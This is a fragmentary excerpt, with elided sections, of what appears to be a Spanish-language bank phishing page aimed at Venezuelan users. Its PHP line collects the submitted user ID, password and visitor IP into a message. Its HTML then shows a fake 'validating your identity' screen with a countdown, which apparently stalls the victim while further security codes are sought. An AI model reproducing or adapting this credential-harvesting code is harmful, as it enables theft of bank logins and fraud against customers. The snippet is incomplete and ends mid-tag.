...
$message = "Vzla\r\n user: ".$_POST['UserId']." Clave: ".$_POST['pass']."\r\nIP: ".$userp."\r\n";
               ...
               <div class="container">
                  ...
                  <div style="background-color: #ffffff; width: 100%;">
                     ...
                     <div style="text-align: center;" align="center">
                        Estamos validando tu identidad. <br> por favor ten cerca tus instrumentos de seguridad<strong id="time"> <br><label id="countdown">0:20</label></strong></div><strong id="time">
